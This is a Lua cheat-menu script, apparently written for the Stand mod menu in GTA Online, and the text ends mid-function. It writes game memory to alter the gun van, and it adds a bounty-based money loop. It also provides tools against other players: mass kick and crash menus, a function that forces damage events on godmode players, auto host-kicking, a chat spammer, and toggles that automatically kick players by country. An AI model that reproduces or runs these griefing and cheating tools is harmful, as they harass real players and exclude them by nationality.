-- Natives
    util.require_natives("3095a", "g")
    util.require_natives("1672190175")
-- Utilities
    root = menu.my_root()
    hyperlink = menu.hyperlink
    slider = menu.slider
    yield = util.yield
    toast = util.toast
    divider = menu.divider
    action = menu.action
    toggle = menu.toggle
    toggle_loop = menu.toggle_loop
    list = menu.list
    kr = util.keep_running
    coms = menu.trigger_commands
    msg = chat.send_message
    restartscript = util.restart_script
    stopscript = util.stop_script
    getvaluee = menu.get_value
    refbyrpath = menu.ref_by_rel_path
    refbypath = menu.ref_by_path
    pname = players.get_name
    host = players.get_host
    shost = players.get_script_host
    pid = playerID
    exists = players.exists
    user = players.user()
    userrid = players.get_rockstar_id(user)
    stdusername = players.get_name(user)
    joaat, toast, yield, draw_debug_text, reverse_joaat = util.joaat, util.toast, util.yield, util.draw_debug_text, util.reverse_joaat
    textinput = menu.text_input
    userstded = menu.get_edition(user)
    userproot = menu.player_root(user)
    trigse = util.trigger_script_event
    clickslider = menu.click_slider
    valreplace = menu.add_value_replacement
    userhosttoken = getvaluee(refbyrpath(userproot, "Information>Host Token"))
    scriptver = "v1.7.2"
-- Lists
    ethself = root:list("Self", {}, "")
    ethmiscs = root:list("Miscs", {}, "Others & Credits")
    scripthosting = ethmiscs:list("Script Host Options")
    customv1 = root:list("Custom commands", {}, "I luv myself for that idea")
    experiments = ethmiscs:list("Experiments", {}, "")
    gunvan = ethmiscs:list("Gun Van", {}, "")
    gvthrow = gunvan:list("Throwables", {}, "Manage the throwables slots instead of weapons")
    ethmmd = ethmiscs:list("Modder Detections")
    credits = root:list("Credits")
    UltBypass = root:list("Ultimate Features")
    spammer = UltBypass:list("Spammer")
    
-- Other Lists
    pall1 = list(refbypath("Players>All Players"), "Kick", {}, "")
    pall15 = list(pall1, "Kicks", {}, "")
    pall2 = list(refbypath("Players>All Players"), "Crash", {}, "")
    soundsList = pall2:list("Crash - Sound Method")
    KickPlay5 = list(pall2, "Interior Kicks")
    friendlyalld = divider(refbypath("Players>All Players>Friendly"), "Euphoria", {}, "")
    friendlyall = list(refbypath("Players>All Players>Friendly"), "Friendly", {}, "")

-- Self
    -- Recovery
        recovery = ethself:list("Recovery", {}, "")
        toggle_loop(recovery, "Money Loop 10k$ [Very Slow.]", {}, "", function()
            coms($"bounty {stdusername} 10000")
            yield(5000)
            coms("removebounty")
            yield(5000)
        end)
-- Requirements

    ---------------------------------------------------- Skidded
        --- Data


            local config = {
            disable_traffic = true,
            disable_peds = true,
            }

        --- Dependencies


            util.ensure_package_is_installed('lua/natives-1672190175')
            local status_natives, natives = pcall(require, "natives-1672190175")
            if not status_natives then error("Could not natives lib. Make sure it is selected under Stand > Lua Scripts > Repository > natives-1672190175") end

        --- Gun Van

            function SetGlobalInt(address, value)
                memory.write_int(memory.script_global(address), value)
            end

            function GetGlobalInt(address)
                return memory.read_int(memory.script_global(address))
            end

            local Globals = 
            {
                Position = 2652572 + 2650, -- Line 3949
                WeaponSlots = 262145 + 34328, -- Line 34887
                WeaponDiscount = 262145 + 34339, -- Line 34889
                ThrowableSlots = 262145 + 34350, -- Line 34903
                ThrowableDiscount = 262145 + 34354, -- Line 34905
                ArmourDiscount = 262145 + 34358 -- Line 34917
            }

            local SelectedSlot = 1
            local SelectedSlot_Throwables = 1
            local CurrentPosition = GetGlobalInt(Globals.Position) + 1
            local DefaultGuns = { GetGlobalInt(Globals.WeaponSlots + 1), GetGlobalInt(Globals.WeaponSlots + 2), GetGlobalInt(Globals.WeaponSlots + 3), GetGlobalInt(Globals.WeaponSlots + 4), GetGlobalInt(Globals.WeaponSlots + 5), GetGlobalInt(Globals.WeaponSlots + 6), GetGlobalInt(Globals.WeaponSlots + 7), GetGlobalInt(Globals.WeaponSlots + 8), GetGlobalInt(Globals.WeaponSlots + 9), GetGlobalInt(Globals.WeaponSlots + 10)  }
            local DefaultThrowables = { GetGlobalInt(Globals.ThrowableSlots + 1), GetGlobalInt(Globals.ThrowableSlots + 2) }
            local GunVanCoords = { {-29.532, 6435.136, 31.162}, 
                {1705.214, 4819.167, 41.75}, 
                {1795.522, 3899.753, 33.869}, 
                {1335.536, 2758.746, 51.099}, 
                {795.583, 1210.78, 338.962}, 
                {-3192.67, 1077.205, 20.594}, 
                {-789.719, 5400.921, 33.915}, 
                {-24.384, 3048.167, 40.703}, 
                {2666.786, 1469.324, 24.237}, 
                {-1454.966, 2667.503, 3.2}, 
                {2340.418, 3054.188, 47.888}, 
                {1509.183, -2146.795, 76.853}, 
                {1137.404, -1358.654, 34.322}, 
                {-57.208, -2658.793, 5.737}, 
                {1905.017, 565.222, 175.558}, 
                {974.484, -1718.798, 30.296}, 
                {779.077, -3266.297, 5.719}, 
                {-587.728, -1637.208, 19.611}, 
                {733.99, -736.803, 26.165}, 
                {-1694.632, -454.082, 40.712}, 
                {-1330.726, -1163.948, 4.313}, 
                {-496.618, 40.231, 52.316}, 
                {275.527, 66.509, 94.108}, 
                {260.928, -763.35, 30.559}, 
                {-478.025, -741.45, 30.299}, 
                {894.94, 3603.911, 32.56}, 
                {-2166.511, 4289.503, 48.733}, 
                {1465.633, 6553.67, 13.771},
                {1101.032, -335.172, 66.944},
                {149.683, -1655.674, 29.028} 
            }

            gunvan:click_slider("1. Choose Gun Van Slot", {}, "Choose the gun van slot to modify from 1-10", 1, 10, 1, 1, function(SlotID) -- The slot ID needs to have an extra 1, the array is actually 0-9 but GTA is dumb
                SelectedSlot = SlotID
                toast("slot #" .. SelectedSlot .. " selected, proceed to step 2.")
            end)

            gunvan:text_input("2. Modify Gun Van Slot", {'SetGVSlot '}, "Set the gunvan slot to the weapon hash \nFound at: https://wiki.rage.mp/index.php?title=Weapons", function(Input)
                SetGlobalInt(Globals.WeaponSlots + SelectedSlot, joaat(Input))
                toast("This weapon is now in the gun van in slot #" .. SelectedSlot .. ".")
            end)

            gunvan:action("Gun Van Discount", {}, "Adds a nice 10% discount to all items in the gun van", function() -- 10% is the limit, from my testing it can't go backwards i think
                SetGlobalInt(Globals.WeaponDiscount, 10) -- Weapons
                SetGlobalInt(Globals.ThrowableDiscount, 10) -- Throwables 
                SetGlobalInt(Globals.ArmourDiscount, 10) -- Armour
            end)

            gunvan:action("Optimal Gun Van Slots", {}, "Adds a few cool weapons like the navy revolver automatically", function()
                SetGlobalInt(Globals.WeaponSlots + 1, joaat("weapon_navyrevolver"))
                SetGlobalInt(Globals.WeaponSlots + 2, joaat("weapon_gadgetpistol"))
                SetGlobalInt(Globals.WeaponSlots + 3, joaat("weapon_stungun_mp"))
                SetGlobalInt(Globals.WeaponSlots + 4, joaat("weapon_doubleaction"))
                SetGlobalInt(Globals.WeaponSlots + 5, joaat("weapon_railgunxm3"))
                SetGlobalInt(Globals.WeaponSlots + 6, joaat("weapon_minigun"))
                SetGlobalInt(Globals.WeaponSlots + 7, joaat("weapon_heavysniper_mk2"))
                SetGlobalInt(Globals.WeaponSlots + 8, joaat("weapon_combatmg_mk2"))
                SetGlobalInt(Globals.WeaponSlots + 9, joaat("weapon_tacticalrifle"))
                SetGlobalInt(Globals.WeaponSlots + 10, joaat("weapon_specialcarbine_mk2"))

                SetGlobalInt(Globals.ThrowableSlots + 1, joaat("weapon_stickybomb"))
                SetGlobalInt(Globals.ThrowableSlots + 2, joaat("weapon_molotov"))
                SetGlobalInt(Globals.ThrowableSlots + 3, joaat("weapon_pipebomb"))

                toast("Better weapons are now in the gun van")
            end)

            gunvan:action("Teleport To Gun Van", {}, "Teleports you to the gun van", function()
                if not GunVanCoords[CurrentPosition] then
                    toast("This event is currently innactive")
                else 
                    Coord = GunVanCoords[CurrentPosition]
                    players.teleport_3d(players.user(), Coord[1], Coord[2], Coord[3])
                end
            end)

            gunvan:click_slider("Set Gun Van Position", {}, "Choose the gun van position", 1, 30, CurrentPosition, 1, function(PositionID)
                CurrentPosition = PositionID
                SetGlobalInt(Globals.Position, CurrentPosition - 1)
                toast("The Gun Van has been moved.")
            end)

            gunvan:action("Reset Gun Van Slots", {}, "Returns the weapons inside the gun van to the originals (when the script was started)", function()
                for SlotID = 1, 10 do
                    SetGlobalInt(Globals.WeaponSlots + SlotID, DefaultGuns[SlotID])
                end

                for SlotID = 1, 2 do
                    SetGlobalInt(Globals.ThrowableSlots + SlotID, DefaultThrowables[SlotID])
                end

                toast("The Gun Van has been restored.")
            end)

            gvthrow:click_slider("1. Choose Gun Van Slot", {}, "Choose the gun van slot to modify from 1-3", 1, 3, 1, 1, function(SlotID) -- The slot ID needs to have an extra 1, the array is actually 0-9 but GTA is dumb
                SelectedSlot_Throwables = SlotID
                toast("slot #" .. SelectedSlot_Throwables .. " selected, proceed to step 2.")
            end)

            gvthrow:text_input("2. Modify Gun Van Slot", {'SetGVSlot2 '}, "Set the gunvan slot to the weapon hash \nFound at: https://wiki.rage.mp/index.php?title=Weapons", function(Input)
                SetGlobalInt(Globals.ThrowableSlots + SelectedSlot_Throwables, util.joaat(Input))

                toast("This weapon is now in the gun van in slot #" .. SelectedSlot_Throwables .. ".")
            end)
    -- Run at start of script
     -- Notification
        async_http.init("https://raw.githubusercontent.com/ScriptHost/Euphoria/main/ver.txt", nil, function(data)
            util.show_corner_help($"Welcome {stdusername} !\nCurrent Euphoria Version : {scriptver}\nLatest Euphoria Version : "..data:split(":")[2])
        end)
        async_http.dispatch()
    -- Auto-Updater (Yes, its back on GitHub, fuck you all.)
        local uwu = {
            auto_update_check_interval = 69420,
        }
        
        local auto_update_config = {
            source_url="https://raw.githubusercontent.com/ScriptHost/Euphoria/main/Euphoria.lua",
            script_relpath=SCRIPT_RELPATH,
            project_url="https://github.com/ScriptHost/Euphoria",
            branch="main",
            dependencies={
            }
        }
        
        util.ensure_package_is_installed('lua/auto-updater')
        local auto_updater = require('auto-updater')
        if auto_updater == true then
            auto_updater.run_auto_update(auto_update_config)
        end

        menu.action(root, "Check for Update", {}, "The script will automatically check for updates at most daily, but you can manually check using this option anytime.", function()
            auto_update_config.check_interval = 0
            if auto_updater.run_auto_update(auto_update_config) then
                toast("No updates found")
            end
        end)
        
-- Other Requirements

    ---------------- Modder Detections and adding detections (Yoinked from Jinx)

        enum eDamageFlags begin
            DF_None								= 0,
            DF_IsAccurate						= 1,
            DF_MeleeDamage						= 2,
            DF_SelfDamage						= 4,
            DF_ForceMeleeDamage					= 8,
            DF_IgnorePedFlags					= 16,
            DF_ForceInstantKill					= 32,
            DF_IgnoreArmor						= 64,
            DF_IgnoreStatModifiers				= 128,
            DF_FatalMeleeDamage					= 256,
            DF_AllowHeadShot					= 512,
            DF_AllowDriverKill					= 1024,
            DF_KillPriorToClearedWantedLevel	= 2048,
            DF_SuppressImpactAudio				= 4096,
            DF_ExpectedPlayerKill				= 8192,
            DF_DontReportCrimes					= 16384,
            DF_PtFxOnly							= 32768,
            DF_UsePlayerPendingDamage			= 65536,
            DF_AllowCloneMeleeDamage			= 131072,
            DF_NoAnimatedMeleeReaction			= 262144,
            DF_IgnoreRemoteDistCheck			= 524288,
            DF_VehicleMeleeHit					= 1048576,
            DF_EnduranceDamageOnly				= 2097152,
            DF_HealthDamageOnly					= 4194304,
            DF_DamageFromBentBullet				= 8388608
        end

        local GlobalplayerBD = 2657921
        local GlobalplayerBD_FM = 1845263
        local GlobalplayerBD_FM_3 = 1886967
        

        local function getPlayerJobPoints(playerID)
            return memory.read_int(memory.script_global(GlobalplayerBD_FM + 1 + (playerID * 877) + 9))  -- Global_1845263[PLAYER::PLAYER_ID() /*877*/].f_9
        end

        local function godKill(playerID)
            local ped = GET_PLAYER_PED_SCRIPT_INDEX(playerID)
            local ping = ROUND(NETWORK_GET_AVERAGE_PING(playerID))
            local timer = (ping > 300) ? (util.current_time_millis() + 5000) : (util.current_time_millis() + 3000)
            local pPed =  entities.handle_to_pointer(ped)
            local pedPtr = entities.handle_to_pointer(players.user_ped())
            yield()
            yield()
            repeat
                trigse(1 << playerID, {800157557, players.user(), 225624744, math.random(0, 9999)})
                util.call_foreign_function(CWeaponDamageEventTrigger, pedPtr, pPed, pPed + 0x90, 0, 1, joaat("weapon_pistol"), 500.0, 0, 0, DF_IsAccurate | DF_IgnorePedFlags | DF_SuppressImpactAudio | DF_IgnoreRemoteDistCheck, 0, 0, 0, 0, 0, 0, 0, 0.0)
                if util.current_time_millis() > timer then
                    toast($"{players.get_name(playerID)}'s godmode can not be removed. :/")
                    timer = util.current_time_millis() + 3000
                    return
                end
                yield()
            until IS_PED_DEAD_OR_DYING(ped)
            yield()
            yield()
            timer = util.current_time_millis() + 3000
        end

        local function isPlayerInAnyVehicle(playerID)
            local ped = GET_PLAYER_PED_SCRIPT_INDEX(playerID)
            return IS_PED_IN_ANY_VEHICLE(ped) and not IS_REMOTE_PLAYER_IN_NON_CLONED_VEHICLE(playerID)
        end

        local function bitTest(bits, place)
            return (bits & (1 << place)) != 0
        end
        
        local function setBit(addr: number, bit: number)
            memory.write_int(addr, memory.read_int(addr) | 1 << bit)
        end
        
        local function clearBit(addr: number, bit: number)
            memory.write_int(addr, memory.read_int(addr) ~ 1 << bit)
        end

        local function isNetPlayerOk(playerID, assert_playing = false, assert_done_transition = true)
            if not NETWORK_IS_PLAYER_ACTIVE(playerID) then return false end
            if assert_playing and not IS_PLAYER_PLAYING(playerID) then return false end
            if assert_done_transition then
                if playerID == memory.read_int(memory.script_global(2672741 + 3)) then
                    return memory.read_int(memory.script_global(2672741 + 2)) != 0
                elseif memory.read_int(memory.script_global(GlobalplayerBD + 1 + (playerID * 463))) != 4 then -- Global_2657921[iVar0 /*463*/] != 4
                    return false
                end
            end
            return true
        end

        local function isDetectionPresent(playerID, detection)
            if players.exists(playerID) and menu.player_root(playerID):isValid() then
                for menu.player_root(playerID):getChildren() as cmd do
                    if cmd:getType() == COMMAND_LIST_CUSTOM_SPECIAL_MEANING and cmd:refByRelPath(detection):isValid() and players.exists(playerID) then
                        return true
                    end
                end
            end
            return false
        end

        local function isPlayerInCutscene(playerID)
            return NETWORK_IS_PLAYER_IN_MP_CUTSCENE(playerID) or IS_PLAYER_IN_CUTSCENE(playerID)
        end

        local function isPlayerRidingRollerCoaster(playerID)
            return bitTest(memory.read_int(memory.script_global(GlobalplayerBD_FM + 1 + (playerID * 877) + 873)), 15) -- Global_1845263[PLAYER::PLAYER_ID() /*877*/].f_873
        end

        local function isFreemodeActive(playerID)
            return NETWORK_IS_PLAYER_A_PARTICIPANT_ON_SCRIPT(playerID, "freemode", -1)
        end

        local function getPlayerCurrentInterior(playerID)
            if not isNetPlayerOk(playerID) then return end -- to prevent random access violations
            return memory.read_int(memory.script_global(GlobalplayerBD + 1 + (playerID * 463) + 245)) -- Global_2657921[bVar0 /*463*/].f_245
        end
            
        local function isPlayerInInterior(playerID)
            if not isNetPlayerOk(playerID) then return end
            return GET_INTERIOR_GROUP_ID(getPlayerCurrentInterior(playerID)) == 0 and getPlayerCurrentInterior(playerID) != 0 or players.is_in_interior(playerID)
        end
            
        local function isPlayerGodmode(playerID)
            local pos = players.get_position(playerID)
            local ped = GET_PLAYER_PED_SCRIPT_INDEX(playerID)
            if isNetPlayerOk(playerID) and (players.is_godmode(playerID) or entities.is_invulnerable(ped)) and not isPlayerInInterior(playerID) and not isPlayerInCutscene(playerID) 
            and isFreemodeActive(playerID) and not players.is_using_rc_vehicle(playerID) and not isPlayerRidingRollerCoaster(playerID) and pos.z > 0.0 then
                return true
            end
            return false
        end

    ---------------- Kick All

        local function AnnoyHostKick(playerID)
            local pid = playerID
            local pnamepid = players.get_name(playerID)
            if user != host() then
                selectedplayer = {}
                for b = 0, 31 do
                selectedplayer[b] = false
                end

                for pid = 0, 31 do
                    if pid ~= user and pid ~= host() and not selectedplayer[pid] and exists(pid) then
                        coms("nonhostkick{pnamepid}")
                        yield()
                    end
                end
            else
                toast("Useless to use this command while your the host")
            end
        end

        local function k4(playerID)
            local pid = playerID
            pnamepid = players.get_name(playerID)
            if user then
                selectedplayer = {}
                for b = 0, 31 do
                selectedplayer[b] = false
                end

                for pid = 0, 31 do
                    if pid ~= user and pid ~= host() and not selectedplayer[pid] and exists(pid) then
                        coms($"loveletterkick{pnamepid}")
                        yield()
                    end
                end
            else
                toast("Useless to use this command when you're the host")
            end
        end

    ---------------- FRC
        local FRC_scan = memory.scan("8A 05 ? ? ? ? 88 83 BC 00 00 00")
        local FRC_address = FRC_scan ? memory.rip(FRC_scan + 0x02) : 0
-- Ultimate Features
 -- Functions
  local function AutoKickHost()
    user = players.user()
    nhp = players.get_host_queue_position(user)
    h = players.get_name(players.get_host())
    h2 = players.get_host(players.user())

    yield(shdelay2)
    if nhp == 1 then
        commands("kick"..h)
    end
    toast("Kicking the host...")
    if user == h2 then
        toast("Turning off Force Host because you are host already.")
        coms("forcehost off")
    end
  end

  local function BlockAllJoins()
    user = players.user()
    host = players.get_host()
    if user == host then
        k4(playerID)
    else
        toast("You are not host!")
        coms("ultbypassblockjoins off")
    end
  end


 -- Spammer
    textinput(spammer, "Text", {"luaspammertext"}, "", function()
    end)
    local SpmDly = 500
    slider(spammer, "Spam Delay", {}, "", 0, 20000, 500, 100, function(SpmDly2)
        SpmDly = SpmDly2
    end)
    spammer:toggle_loop("Spammer", {}, "", function()
        yield(SpmDly)
        msg(getvaluee(refbyrpath(spammer, "Text")), false, true, true)
    end)
 -- Auto Kick Host
    UltBypass:toggle_loop("Auto Kick Host", {}, "", function()
        AutoKickHost()
    end)
 -- Block All Joins
    local BAJDel = 3000
    UltBypass:slider("Block Delay", {}, "Because its simply a kick all on loop.", 0, 120000, 3000, 1000, function(BAJDel2)
        BAJDel = BAJDel2
    end)
    UltBypass:toggle_loop("Block All Joins", {}, "its simply a kick all on loop.", function()
        yield(BAJDel)
        BlockAllJoins()
        toast("Kicked all Players !")
    end)
-- Experiments

    autodetectcountry = list(experiments, "Detect Countries")
    autokickcountry = list(experiments, "Auto-Kick Countries")
    experiiments = list(experiments, "Experiiments :)")
    autokicks = list(experiments, "Auto-Kicks")

    -- Kick Function

    toggle_loop(experiiments, "Toast all modders", {}, "", function()
        for players.list() as playerID do
            modder = players.is_marked_as_modder(playerID)
            name = players.get_name(playerID)
        if modder then
            toast(name.." is a modder.")
        end
        end
    end)

    toggle_loop(experiiments, "Toast yappers", {}, "", function()
        for players.list() as playerID do
            typing = players.is_typing(playerID)
            name = players.get_name(playerID)
        if typing then
            toast(name.." is typing.")
        end
        end
    end)

    toggle_loop(experiiments, "Toast off the radar players", {}, "", function()
        for players.list() as playerID do
            otr = players.is_otr(playerID)
            name = players.get_name(playerID)
        if otr then
            toast(name.." is off the radar.")
        end
        end
    end)

    toggle_loop(experiiments, "Get Current Stand Language", {}, "", function()
        toast(lang.get_current())
    end)

    toggle_loop(experiiments, "util.is_session_started", {}, "", function()
        toast(util.is_session_started())
    end)

    toggle_loop(experiiments, "util.is_session_transition_active", {}, "", function()
        toast(util.is_session_transition_active())
    end)

    sesshopper = list(experiiments, "Session Hopper")

    local hopdel = 50000
    slider(sesshopper, "Session Switching Delay", {}, "Switches session every X ms", 50000, 350000, 50000, 1000, function(hopdel2)
        hopdel = hopdel2
    end)
    toggle_loop(sesshopper, "Auto Session Switcher", {}, "Reminder that 1000 = 1 second.", function()
        coms("go public")
        yield(hopdel)
    end)

    toggle_loop(autokickcountry, "French", {"autokickfrench"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "France" or Country == "Belgium" or Country == "Switzerland" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
    end
    end)

    toggle_loop(autodetectcountry, "French", {"autodetectfrench"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "France" or Country == "Belgium" or Country == "Switzerland" then
            toast(name.." is French!")
            end
        end
    end)

    toggle_loop(autodetectcountry, "Spanish", {"autodetectspanish"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "Spain" or Country == "Brazil" or Country == "Portugal" then
            toast(name.." is Spanish!")
            end
        end
    end)

    toggle_loop(autokickcountry, "Spanish", {"autokickspanish"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "Spain" or Country == "Brazil" or Country == "Portugal" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)

    toggle_loop(autodetectcountry, "English (United Kingdom / US)", {"autodetectenglish"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "United Kingdom" or Country == "United States" then
            toast(name.." is English!")
            end
        end
    end)

    toggle_loop(autokickcountry, "English (United Kingdom / US)", {"autokickenglish"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "United Kingdom" or Country == "United States" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)

    toggle_loop(autodetectcountry, "Russian", {"autodetectrussian"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "Ukraine" or Country == "Russian Federation" or Country == "Latvia" then
            toast(name.." is Russian!")
            end
        end
    end)

    toggle_loop(autokickcountry, "Russian", {"autokickrussian"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "Russian Federation" or Country == "Ukraine" or Country == "Latvia" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)

    toggle_loop(autodetectcountry, "German", {"autodetectgerman"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "Germany" or Country == "Switzerland" then
            toast(name.." is German!")
            end
        end
    end)

    toggle_loop(autokickcountry, "German", {"autokickgerman"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "Germany" or Country == "Switzerland" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)

    toggle_loop(autodetectcountry, "Italian", {"autodetectitalian"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "Italy" or Country == "Switzerland" then
            toast(name.." is Italian!")
            end
        end
    end)

    toggle_loop(autokickcountry, "Italian", {"autokickitalian"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "Italy" or Country == "Switzerland" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)

    toggle_loop(autodetectcountry, "Japanese / Chinese", {"autodetectasia"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "China" or Country == "Japan" or Country == "Hong Kong" then
            toast(name.." is Chinese / Japanese!")
            end
        end
    end)

    toggle_loop(autokickcountry, "Japanese / Chinese", {"autokickasia"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "China" or Country == "Japan" or Country == "Hong Kong" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)

    toggle_loop(autodetectcountry, "Polish", {"autodetectpolish"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "Poland" then
            toast(name.." is Polish!")
            end
        end
    end)

    toggle_loop(autokickcountry, "Polish", {"autokickpolish"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "Poland" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)

    toggle_loop(autodetectcountry, "Romanian", {"autodetectromanian"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "Romania" then
            toast(name.." is Romanian!")
            end
        end
    end)

    toggle_loop(autokickcountry, "Romanian", {"autokickromanian"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "Romania" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)

    toggle_loop(autodetectcountry, "Bulgarian", {"autodetectbulgarian"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "Bulgaria" then
            toast(name.." is Bulgarian!")
            end
        end
    end)

    toggle_loop(autokickcountry, "Bulgarian", {"autokickbulgarian"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "Bulgarian" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)

    toggle_loop(autodetectcountry, "Czech", {"autodetectczech"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "Czech Republic" then
            toast(name.." is Czech!")
            end
        end
    end)

    toggle_loop(autokickcountry, "Czech", {"autokickczech"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "Czech Republic" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)

    toggle_loop(autodetectcountry, "Netherlands", {"autodetectnetherlands"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "Czech Republic" then
            toast(name.." is from the Netherlands!")
            end
        end
    end)

    toggle_loop(autokickcountry, "Netherlands", {"autokicknetherlands"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "Netherlands" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)

    toggle_loop(autodetectcountry, "Nordic Countries", {"autodetectpolarpeak"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
        if Country == "Sweden" or Country == "Norway" then
            toast(name.." is from nordic countries!")
            end
        end
    end)

    toggle_loop(autokickcountry, "Nordic Countries", {"autokickpolarpeak"}, "", function()
        for players.list() as playerID do
            local Country = menu.ref_by_rel_path(menu.player_root(playerID), "Information>Connection>Country").value
            local name = players.get_name(playerID)
            local user = players.user()
            local host = players.get_host()
        if Country == "Sweden" or Country == "Norway" then
            if user == host then
                coms("loveletter"..name)
            else
                coms("nonhostkick"..name)
            end
        end
        end
    end)
-- Misc Options

    ethmiscs:action("Open Stand Folder", {"opstd"}, "Shortcut : Stand Folder", function()
        coms("openstandfolder")
    end)

    ethmiscs:action("Clear Notifications", {"clrnot"}, "Clears all notifications, both stand and mini map.", function()
        coms("clearnotifications;clearstandnotifys")
    end)

    ethmmd:toggle_loop("2Take1 User", {}, "Detects people using 2Take1. (Note: player must be in a vehicle spawned by them)", function()
        for players.list_except() as playerID do
            local pid = playerID
            local ped = GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local vehicle = GET_VEHICLE_PED_IS_USING(ped)
            local bitset = DECOR_GET_INT(vehicle, "MPBitset")
            local pegasusveh = DECOR_GET_BOOL(vehicle, "CreatedByPegasus")
            if isNetPlayerOk(pid) and bitset == 1024 and players.get_weapon_damage_modifier(pid) == 1 and not entities.is_invulnerable(ped) and not pegasusveh and getPlayerJobPoints(pid) == 0 then
                if not isDetectionPresent(pid, "2Take1 User") then
                    players.add_detection(pid, "2Take1 User", TOAST_ALL, 100)
                    msg(name.." is a silly 2Take1 User !", false, true, true)
                    return
                end
            end
        end
        yield(250)
    end)

    ethmmd:toggle_loop("YimMenu User", {}, "Detects people using YimMenu's \"Force Session Host\". This will also detect menus that have skidded from YimMenu such as Ethereal.", function() -- checking silly hardcoded host token cus who tf manually sets theirs to this anyways
        local pid = playerID
        for players.list() as pid do
